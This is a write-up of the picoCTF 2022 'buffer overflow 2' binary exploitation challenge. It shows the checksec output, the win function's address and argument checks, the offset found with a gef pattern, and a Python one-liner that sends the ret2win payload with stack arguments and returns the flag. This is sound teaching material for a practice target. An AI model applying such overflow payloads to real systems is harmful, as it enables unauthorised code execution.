# buffer overflow 2
## Description
- **Tags**:
    - picoCTF 2022
    - Binary Exploitation
    - gets
    - arguments_on_the_stack

- **Author**:
    - Sanjay C
    - Palash Oswal

Control the return address and arguments

This time you'll need to control the arguments to the function you return to! Can you get the flag from this [program](https://artifacts.picoctf.net/c/345/vuln)?
You can view source [here](https://artifacts.picoctf.net/c/345/vuln.c). And connect with it using

```
nc saturn.picoctf.net 57759
```

## Exploration

Taking a look at the architecture and protections on the binary it seems we're using x86 with no PIE, so we should be able to do a ret2win style exploit.

```
$ checksec vuln{,.elf}
[*] '/home/keithjh/src/CTF/pico/2022/Binary_Exploitation/buffer_overflow_2/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] '/home/keithjh/src/CTF/pico/2022/Binary_Exploitation/buffer_overflow_2/vuln.elf'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

As the challenge title and description suggest, however, there will be additional complexity in also controlling the arguments passed to the function. First we'll identify what values will be necessary, either by looking at the source or the binary (which could also be better done by dynamic analysis running under a debugger).

```
$ grep '!=' vuln.c
  if (arg1 != 0xCAFEF00D)
  if (arg2 != 0xF00DF00D)

$ objdump --disassemble=win vuln.elf | grep cmp
 80492c8:       83 7d f4 00             cmpl   $0x0,-0xc(%ebp)
 804930c:       81 7d 08 0d f0 fe ca    cmpl   $0xcafef00d,0x8(%ebp)
 8049315:       81 7d 0c 0d f0 0d f0    cmpl   $0xf00df00d,0xc(%ebp)
```

And lastly we still need to now the location of the function we're jumping to:
```
$ readelf -s vuln.elf | grep win
    64: 08049296   162 FUNC    GLOBAL DEFAULT   15 win
```

Now we can start as usual to find the offset
```
$ gdb vuln.elf
gef➤  pattern create 120
[+] Generating a pattern of 120 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab
[+] Saved as '$_gef2'
gef➤  r <<< aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab
gef➤  pattern search $eip
[+] Searching for '$eip'
[+] Found at offset 112 (little-endian search) likely
[+] Found at offset 304 (big-endian search)
```

And craft a payload that is the overflow, EIP, padding, and finaly the argument values we need. Note that x86 passes arguments on the stack, hence why we can include them directly in the payload. If this were x64 it would be slightly more complicated as we'd need to find ways to provide the arguments via registers.
```
$ python3 -c 'import sys; import struct; sys.stdout.buffer.write(b"A"*112 + struct.pack("<I", 0x8049296) + struct.pack("<I", 0x0) + struct.pack("<I", 0xCAFEF00D) + struct.pack("<I", 0xF00DF00D))' | ./vuln.elf
Please enter your string:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
picoCTF{REDACTED}
```

And finally a bonus script to tie it all together
```
$ ./exploit_vuln.py
picoCTF{REDACTED}
```